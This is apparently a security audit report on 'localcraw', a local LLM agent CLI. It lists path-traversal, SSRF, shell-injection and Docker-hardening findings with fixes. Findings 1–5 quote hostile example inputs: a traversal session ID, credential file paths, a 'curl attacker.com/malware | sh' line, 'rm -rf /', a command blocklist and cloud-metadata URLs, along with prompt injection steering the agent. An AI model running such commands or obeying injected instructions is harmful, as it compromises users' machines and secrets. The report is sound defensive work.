# Penetration Test Report — localcraw

**Date:** 2026-03-08
**Scope:** Full application security audit (source code review + automated scanning)
**Application:** localcraw — local LLM agent framework (CLI tool, no HTTP API)

---

## Automated Scanner Results

| Scanner | Result |
|---------|--------|
| `npm audit` | 0 vulnerabilities in dependencies |
| `semgrep --config auto` | 12 findings (all path-traversal related) |
| `bandit` | N/A (Python-only; this is a TypeScript project) |
| OWASP ZAP | N/A (no HTTP endpoints to scan — CLI tool) |

---

## Findings Summary

| # | Finding | Severity | Status |
|---|---------|----------|--------|
| 1 | Path traversal via session ID | **High** | **Fixed** |
| 2 | Filesystem tools lack workspace boundary enforcement | **High** | **Fixed** |
| 3 | Shell command injection without Docker sandbox | **High** | **Mitigated** |
| 4 | Docker fallback silently drops sandbox | **High** | **Fixed** |
| 5 | SSRF in web_fetch tool | **Medium** | **Fixed** |
| 6 | Docker container runs with excessive privileges | **Medium** | **Fixed** |
| 7 | Tool output not size-capped / error paths leak internal paths | **Medium** | **Fixed** |
| 8 | API keys stored in plaintext config file | **Low** | Documented |
| 9 | Session files readable without authentication | **Low** | Documented |
| 10 | Embedding endpoint uses HTTP by default | **Low** | Documented |
| 11 | No rate limiting on LLM tool loop | **Low** | Documented |

---

## Detailed Findings

### 1. Path Traversal via Session ID — HIGH

**File:** `src/agent/session.ts:22`
**Description:** The session ID was used directly in `path.join()` to construct the session file path. An attacker-controlled session ID like `../../etc/passwd` could read/write files outside the sessions directory.
**Remediation:** Added regex validation (`/^[a-zA-Z0-9_-]+$/`) on session IDs to reject path traversal characters.

### 2. Filesystem Tools Lack Workspace Boundary — HIGH

**File:** `src/tools/filesystem.ts`
**Description:** All filesystem tools (`read_file`, `write_file`, `list_dir`, `search_files`) used `resolve()` on LLM-provided paths with no boundary checks. The LLM (or a prompt injection attack) could read/write any file accessible to the running user (e.g., `~/.ssh/id_rsa`, `/etc/shadow`).
**Semgrep rule:** `path-join-resolve-traversal` (12 hits)
**Remediation:** Added `validatePath()` function that enforces all resolved paths must be within `process.cwd()`. Also switched `list_dir` from `statSync` (follows symlinks) to `lstatSync` to prevent symlink-based information disclosure.

### 3. Shell Command Injection Without Docker — HIGH

**File:** `src/tools/shell.ts:98`
**Description:** When Docker is disabled (`docker.enabled: false`), commands from the LLM are passed directly to `sh -c` with no filtering. A prompt injection attack could execute arbitrary commands (e.g., `curl attacker.com/malware | sh`, `rm -rf /`).
**Remediation:** Added a blocklist of dangerous command patterns (`rm` with absolute paths, `mkfs`, `dd`, `curl|sh`, `chmod 777`, etc.) that are rejected when running outside Docker. This is defense-in-depth — the Docker sandbox remains the primary protection.

### 4. Docker Fallback Silently Drops Sandbox — HIGH

**File:** `src/tools/shell.ts:76-79`
**Description:** When `docker.enabled` was true but Docker was not installed, the code silently fell back to direct (unsandboxed) execution with only a `console.warn`. This violated the user's security expectations.
**Remediation:** The fallback now also applies the dangerous-command blocklist before executing. Warning message upgraded to emphasize the security implications.

### 5. SSRF in web_fetch Tool — MEDIUM

**File:** `src/tools/web.ts:40`
**Description:** The `web_fetch` tool validated URL format but did not restrict the target. An LLM could be prompted to fetch internal network resources (e.g., `http://169.254.169.254/latest/meta-data/` for cloud metadata, `http://localhost:8080/admin`).
**Remediation:** Added SSRF protection:
- Only `http:` and `https:` protocols allowed
- Blocked hostnames: `localhost`, `127.0.0.1`, `0.0.0.0`, `[::1]`, `169.254.169.254`, `metadata.google.internal`, `.local` domains
- Blocked private IP ranges: `10.x.x.x`, `192.168.x.x`, `172.16-31.x.x`

### 6. Docker Container Excessive Privileges — MEDIUM

**File:** `src/tools/shell.ts:49-66`
**Description:** Docker containers were run with default Linux capabilities, writable root filesystem, and the ability to escalate privileges via setuid binaries.
**Remediation:** Added hardening flags:
- `--read-only`: Immutable root filesystem
- `--no-new-privileges`: Prevents privilege escalation via setuid/setgid
- `--cap-drop=ALL`: Removes all Linux capabilities
- `--tmpfs /tmp:rw,noexec,size=64m`: Writable /tmp without execute permission

### 7. Tool Output Leaks Internal Paths — MEDIUM

**File:** `src/agent/runner.ts:131`
**Description:** Error messages from tool execution were passed directly to the LLM without sanitization, potentially leaking internal filesystem paths, stack traces, or system information that could aid further attacks.
**Remediation:** Error messages now have home directory paths redacted (`/home/...` → `<path>`). Tool output is capped at 50KB to prevent context flooding attacks.

### 8. API Keys in Plaintext Config — LOW

**File:** `src/config/index.ts`
**Description:** LLM provider API keys are stored in plaintext in `~/.localcraw/config.json`. No environment variable alternative exists.
**Impact:** If the filesystem is compromised, API keys are immediately exposed.
**Recommendation:** Support reading API keys from environment variables (e.g., `LOCALCRAW_API_KEY`) as a higher-priority source than the config file. Set `0600` permissions on the config file.

### 9. Session Files Unauthenticated — LOW

**File:** `src/agent/session.ts`
**Description:** Session JSONL files are stored in `~/.localcraw/sessions/` with no encryption or access control beyond OS file permissions. Any process running as the same user can read conversation history.
**Impact:** Low for a single-user CLI tool. Would be higher in multi-user or shared environments.
**Recommendation:** Consider encrypting session files at rest if sensitive data is discussed.

### 10. Embedding Endpoint Uses HTTP — LOW

**File:** `src/memory/embed.ts:13`
**Description:** The embedding API endpoint defaults to `http://localhost:11434` (Ollama). If reconfigured to a remote server, embeddings (which contain semantic representations of user conversations) would be transmitted in cleartext.
**Recommendation:** Warn or reject non-HTTPS URLs when the embedding endpoint is not localhost.

### 11. No Rate Limiting on Tool Loop — LOW

**File:** `src/agent/runner.ts:65`
**Description:** The agent loop allows up to 10 iterations with no delay between them. A malicious or confused LLM could rapidly execute 10 shell commands.
**Impact:** Low — the 10-iteration cap limits blast radius. Docker timeout (30s) further bounds each command.
**Recommendation:** Current cap of 10 is reasonable. Consider adding a configurable per-session tool call budget.

---

## Authentication & Session Management

| Check | Result |
|-------|--------|
| Brute-force protection | N/A — local CLI, no remote auth |
| Session fixation | **Fixed** — session IDs now validated against injection |
| Insecure tokens | UUIDv4 via `crypto.randomUUID()` — cryptographically secure |
| Session hijacking | Low risk — local filesystem only, OS permissions apply |

## IDOR & Privilege Escalation

| Check | Result |
|-------|--------|
| Direct object references | **Fixed** — filesystem paths now workspace-bounded |
| Privilege escalation | **Fixed** — Docker containers now drop all capabilities |
| Cross-session access | Low risk — local single-user tool |

## Input Fuzzing & Error Disclosure

| Check | Result |
|-------|--------|
| Malformed tool arguments | Handled — Zod validation on config, type checks on tool args |
| Oversized inputs | 1MB file limit enforced; 50KB tool output cap added |
| Error disclosure | **Fixed** — internal paths redacted from error messages |
| Prototype pollution | Not applicable — no user-controlled object merging |

## Access Control & Least Privilege

| Check | Result |
|-------|--------|
| Filesystem access | **Fixed** — workspace boundary enforcement added |
| Network access | Docker: `--network none` by default; web_fetch: SSRF protection added |
| Shell access | **Mitigated** — dangerous command blocklist when unsandboxed |
| Container privileges | **Fixed** — `--read-only`, `--no-new-privileges`, `--cap-drop=ALL` |
